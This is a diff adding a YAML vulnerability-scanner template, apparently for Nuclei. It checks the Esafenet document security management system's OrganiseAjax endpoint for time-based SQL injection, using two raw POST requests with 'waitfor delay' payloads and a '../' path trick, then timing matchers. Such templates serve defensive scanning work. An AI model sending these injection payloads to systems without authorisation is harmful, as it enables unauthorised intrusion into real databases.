@@ -1,0 +1,39 @@
+id: poc-yaml-yisaitong-esafenet-organiseajax-sqli
+info:
+  name: "亿赛通电子文档安全管理系统 OrganiseAjax SQL注入"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 亿赛通电子文档安全管理系统
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../OrganiseAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        command=search&groupNameSearch=-1'waitfor delay '0:0:5'--
+      - |
+        POST /CDGServer3/js/../OrganiseAjax HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        command=search&groupNameSearch=-1'waitfor delay '0:0:8'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "waitfor delay"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
